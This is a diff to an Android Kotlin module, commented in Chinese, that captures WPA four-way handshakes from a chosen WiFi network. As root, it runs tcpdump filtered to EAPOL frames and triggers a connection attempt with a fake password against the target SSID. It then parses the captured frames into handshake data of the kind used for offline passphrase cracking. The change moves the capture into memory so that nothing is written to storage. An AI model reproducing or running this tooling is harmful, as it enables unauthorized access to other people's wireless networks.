@@ -1,13 +1,11 @@
 package com.whmdg.mczj.tools.capture
 
 import android.content.Context
-import com.whmdg.mczj.tools.AppDataPaths
 import com.whmdg.mczj.tools.security.SpecialPermissionVerifier
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.withContext
 import java.io.DataInputStream
-import java.io.File
 
 /**
  * WiFi 四次握手抓包器
@@ -32,8 +30,7 @@ object HandshakeCapture {
         val keyLen: Int,                // Key Length 字段
         val keyDescriptor: Int,         // Key Descriptor Type (2=RSN, 254=WPA)
         val eapolVersion: Int,          // 802.1X 版本
-        val eapolFrames: List<String>,  // 各帧完整 EAPOL 数据 hex
-        val pcapFilePath: String        // 原始 pcap 文件路径
+        val eapolFrames: List<String>   // 各帧完整 EAPOL 数据 hex
     )
 
     /**
@@ -72,14 +69,11 @@ object HandshakeCapture {
         fakePassword: String = "12345678",
         onProgress: (String) -> Unit
     ): HandshakeData? = withContext(Dispatchers.IO) {
-        val pcapDir = File(AppDataPaths.root(context), "capture")
-        val pcapFile = File(pcapDir, "handshake_${System.currentTimeMillis()}.pcap")
-        SpecialPermissionVerifier.executeRootCommandFull("mkdir -p '${pcapDir.absolutePath}'")
+        onProgress("启动 tcpdump（普通模式）...")
 
-        onProgress("启动 tcpdump...")
-
-        // 1. 启动 tcpdump 后台进程
-        val tcpdumpCmd = "tcpdump -i $iface -w ${pcapFile.absolutePath} ether proto 0x888e"
+        // 1. 启动 tcpdump，管道输出 base64 到 stdout，内存处理不写物理存储
+        //    -c 10: 最多抓 10 个 EAPOL 帧后自动停止
+        val tcpdumpCmd = "tcpdump -i $iface -c 10 -w - ether proto 0x888e | base64"
         val tcpdumpProcess = try {
             Runtime.getRuntime().exec(arrayOf("su", "-c", tcpdumpCmd))
         } catch (e: Exception) {
@@ -87,133 +81,102 @@ object HandshakeCapture {
             return@withContext null
         }
 
-        val tcpdumpPid = getPid(tcpdumpProcess)
+        // 后台读取 stdout（base64 编码的 pcap 数据）
+        val stdoutBuf = StringBuilder()
+        val stderrBuf = StringBuilder()
+        val stdoutThread = Thread {
+            try {
+                tcpdumpProcess.inputStream.bufferedReader(Charsets.UTF_8).useLines { lines ->
+                    lines.forEach { stdoutBuf.appendLine(it) }
+                }
+            } catch (_: Exception) {}
+        }.apply { start() }
+        val stderrThread = Thread {
+            try {
+                tcpdumpProcess.errorStream.bufferedReader(Charsets.UTF_8).useLines { lines ->
+                    lines.forEach { stderrBuf.appendLine(it) }
+                }
+            } catch (_: Exception) {}
+        }.apply { start() }
+
         delay(500) // 等待 tcpdump 就绪
 
         try {
-            // 2. 发送假密码触发握手
+            // 2. 发送假密码触发握手（自己发包自己抓）
             onProgress("发送认证请求触发握手...")
             val connectCmd = "cmd wifi connect-network \"$targetSsid\" wpa2 \"$fakePassword\""
             SpecialPermissionVerifier.executeRootCommandFull(connectCmd)
 
-            // 3. 等待握手：监听连接状态 + EAPOL 帧活动
+            // 3. 等待 tcpdump 完成（-c 10 抓满自动停止，或 20 秒超时）
             onProgress("等待握手包...")
-            waitForHandshake(iface, pcapFile, onProgress)
+            val maxWait = 20_000L
+            val start = System.currentTimeMillis()
+            while (System.currentTimeMillis() - start < maxWait) {
+                try {
+                    tcpdumpProcess.exitValue()
+                    break // 已自然退出
+                } catch (_: IllegalThreadStateException) {
+                    delay(500)
+                    // stderr 有输出时显示进度
+                    val err = stderrBuf.toString()
+                    if (err.isNotEmpty()) {
+                        val lastLine = err.trim().lines().lastOrNull() ?: ""
+                        if (lastLine.contains("packet", ignoreCase = true)) {
+                            onProgress("抓包中: $lastLine")
+                        }
+                    }
+                }
+            }
 
-            // 4. 优雅停止 tcpdump
-            onProgress("停止抓包...")
-            stopTcpdumpGracefully(tcpdumpProcess, tcpdumpPid)
+            // 超时则 kill
+            try {
+                tcpdumpProcess.exitValue()
+            } catch (_: IllegalThreadStateException) {
+                onProgress("超时，停止抓包...")
+                val pid = getPid(tcpdumpProcess)
+                if (pid > 0) {
+                    SpecialPermissionVerifier.executeRootCommandFull("kill -2 $pid")
+                }
+                stdoutThread.join(3000)
+                stderrThread.join(1000)
+            }
 
-            // 5. 解析 pcap
+            // 4. 解析内存中的 pcap 数据
             onProgress("解析握手数据...")
-            val frames = parsePcap(pcapFile.absolutePath)
+            val b64Data = stdoutBuf.toString().replace("\n", "").replace("\r", "").trim()
+            if (b64Data.isEmpty()) {
+                onProgress("未捕获到 EAPOL 帧")
+                return@withContext null
+            }
+
+            val rawData = try {
+                android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT)
+            } catch (_: Exception) {
+                onProgress("解码 pcap 数据失败")
+                return@withContext null
+            }
+            if (rawData.size < 24) {
+                onProgress("pcap 数据不完整")
+                return@withContext null
+            }
+
+            val frames = parsePcapBytes(rawData)
             if (frames.isEmpty()) {
                 onProgress("未捕获到 EAPOL 帧")
                 return@withContext null
             }
 
-            // 6. 提取握手数据
+            // 5. 提取握手数据
+            onProgress("提取握手数据...")
             val bssid = targetBssid ?: frames.firstOrNull()?.srcMac ?: ""
-            extractHandshake(frames, targetSsid, bssid, pcapFile.absolutePath)
+            extractHandshake(frames, targetSsid, bssid)
         } catch (e: Exception) {
             onProgress("抓包异常: ${e.message}")
-            stopTcpdumpGracefully(tcpdumpProcess, tcpdumpPid)
-            null
-        }
-    }
-
-    /**
-     * 等待握手完成
-     * 停止条件：接口断开 或 30秒无新 EAPOL 帧
-     */
-    private suspend fun waitForHandshake(
-        iface: String,
-        pcapFile: File,
-        onProgress: (String) -> Unit
-    ) {
-        val startTime = System.currentTimeMillis()
-        val maxWait = 60_000L       // 最大等待 60 秒
-        val inactivityTimeout = 20_000L // 20 秒无活动则停止
-        var lastPcapSize = 0L
-        var lastActivityTime = System.currentTimeMillis()
-        var eapolCount = 0
-
-        while (System.currentTimeMillis() - startTime < maxWait) {
-            delay(1000)
-
-            // 检查接口状态
-            if (isInterfaceDisconnected(iface)) {
-                onProgress("接口已断开，握手完成")
-                break
-            }
-
-            // 检查 pcap 文件大小变化（新增 EAPOL 帧）
-            val currentSize = try {
-                val (sz, _, szExit) = SpecialPermissionVerifier.executeRootCommandFull("stat -c %s '${pcapFile.absolutePath}'")
-                if (szExit == 0) sz.trim().toLongOrNull() ?: 0L else 0L
-            } catch (_: Exception) { 0L }
-            if (currentSize > lastPcapSize) {
-                lastPcapSize = currentSize
-                lastActivityTime = System.currentTimeMillis()
-                eapolCount++
-                onProgress("捕获到 EAPOL 帧 ($eapolCount)")
-            }
-
-            // 30 秒无活动超时
-            if (System.currentTimeMillis() - lastActivityTime > inactivityTimeout) {
-                onProgress("20 秒无 EAPOL 活动，自动停止")
-                break
-            }
-        }
-    }
-
-    /**
-     * 检测 wlan 接口是否已断开
-     */
-    private fun isInterfaceDisconnected(iface: String): Boolean {
-        // 方法1: wpa_cli
-        val (stdout, _, exitCode) = SpecialPermissionVerifier.executeRootCommandFull("wpa_cli -i $iface status")
-        if (exitCode == 0) {
-            val wpaState = stdout.lines()
-                .find { it.startsWith("wpa_state=") }
-                ?.substringAfter("wpa_state=")
-            if (wpaState == "DISCONNECTED" || wpaState == "SCANNING" || wpaState == "INACTIVE") {
-                return true
-            }
-        }
-        // 方法2: operstate (需 root)
-        val (opState, _, opExit) = SpecialPermissionVerifier.executeRootCommandFull("cat /sys/class/net/$iface/operstate")
-        val operstate = if (opExit == 0) opState.trim() else "up"
-        return operstate == "down"
-    }
-
-    /**
-     * 优雅停止 tcpdump：发送 SIGINT，等待进程退出
-     */
-    private suspend fun stopTcpdumpGracefully(process: Process, pid: Int) {
-        withContext(Dispatchers.IO) {
             try {
-                // SIGINT = kill -2
-                SpecialPermissionVerifier.executeRootCommandFull("kill -2 $pid")
-                // 等待进程退出（最多 5 秒）
-                val start = System.currentTimeMillis()
-                while (System.currentTimeMillis() - start < 5000) {
-                    try {
-                        process.exitValue()
-                        break // 已退出
-                    } catch (_: IllegalThreadStateException) {
-                        delay(200)
-                    }
-                }
-                // 如果还没退出，再尝试一次
-                try {
-                    process.exitValue()
-                } catch (_: IllegalThreadStateException) {
-                    process.destroyForcibly()
-                }
-            } catch (_: Exception) {
-                process.destroyForcibly()
-            }
+                val pid = getPid(tcpdumpProcess)
+                if (pid > 0) SpecialPermissionVerifier.executeRootCommandFull("kill -2 $pid")
+            } catch (_: Exception) {}
+            null
         }
     }
 
@@ -226,34 +189,18 @@ object HandshakeCapture {
             pidField.isAccessible = true
             pidField.getInt(process)
         } catch (_: Exception) {
-            // 回退：通过 /proc 查找
             try {
-                val cmd = "pidof tcpdump"
-                val (stdout, _, _) = SpecialPermissionVerifier.executeRootCommandFull(cmd)
+                val (stdout, _, _) = SpecialPermissionVerifier.executeRootCommandFull("pidof tcpdump")
                 stdout.trim().split("\\s+".toRegex()).lastOrNull()?.toIntOrNull() ?: -1
             } catch (_: Exception) { -1 }
         }
     }
 
     /**
-     * 解析 pcap 文件，提取 EAPOL 帧（通过 root 读取）
-     *
-     * pcap 文件格式：
-     * - 全局头: 24 字节
-     * - 每个包: [包头16字节] [包数据]
+     * 解析内存中的 pcap 字节数据，提取 EAPOL 帧
      */
-    private fun parsePcap(filePath: String): List<EapolFrame> {
+    private fun parsePcapBytes(rawData: ByteArray): List<EapolFrame> {
         val frames = mutableListOf<EapolFrame>()
-
-        // 通过 root base64 读取 pcap 二进制数据
-        val (b64, _, exitCode) = SpecialPermissionVerifier.executeRootCommandFull("base64 '$filePath'")
-        if (exitCode != 0 || b64.isEmpty()) return frames
-
-        val rawData = try {
-            android.util.Base64.decode(b64.replace("\n", ""), android.util.Base64.DEFAULT)
-        } catch (_: Exception) { return frames }
-        if (rawData.size < 24) return frames
-
         try {
             DataInputStream(rawData.inputStream()).use { dis ->
                 // 读取全局头 (24 bytes)
@@ -373,8 +320,7 @@ object HandshakeCapture {
     private fun extractHandshake(
         frames: List<EapolFrame>,
         ssid: String,
-        bssid: String,
-        pcapPath: String
+        bssid: String
     ): HandshakeData? {
         val msg1 = frames.find { it.msgType == 1 }
         val msg2 = frames.find { it.msgType == 2 }
@@ -425,8 +371,7 @@ object HandshakeCapture {
             keyLen = keyLen,
             keyDescriptor = keyDescriptor,
             eapolVersion = eapolVersion,
-            eapolFrames = eapolHexList,
-            pcapFilePath = pcapPath
+            eapolFrames = eapolHexList
         )
     }
 
